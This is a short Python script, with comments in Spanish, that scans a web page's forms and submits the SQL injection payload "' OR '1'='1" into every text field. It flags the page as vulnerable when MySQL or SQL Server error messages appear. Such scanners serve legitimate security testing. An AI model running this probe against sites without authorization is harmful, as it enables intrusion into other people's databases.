import requests
from bs4 import BeautifulSoup

def is_vulnerable_to_sqli(url, session):
    sqli_errors = ["you have an error in your sql syntax;", "warning: mysql", "unclosed quotation mark after the character string", "quoted string not properly terminated"]
    try:
        response = session.get(url)
        soup = BeautifulSoup(response.content, 'html.parser')
        for form in soup.find_all('form'):
            action = form.get('action')
            method = form.get('method')
            inputs = form.find_all('input')
            data = {}
            for input in inputs:
                input_name = input.get('name')
                input_type = input.get('type')
                input_value = input.get('value')
                if input_type == 'text':
                    data[input_name] = "' OR '1'='1"  # Aquí está la inyección
                else:
                    data[input_name] = input_value

            if method == 'post':
                response = session.post(url + action, data=data)
            else:
                response = session.get(url + action, params=data)

            if any(error in response.text for error in sqli_errors):
                return True  # La página es vulnerable

        return False  # La página no es vulnerable

    except requests.exceptions.RequestException as err:
        print(f'Request error occurred during SQLi check: {err}')
        return False
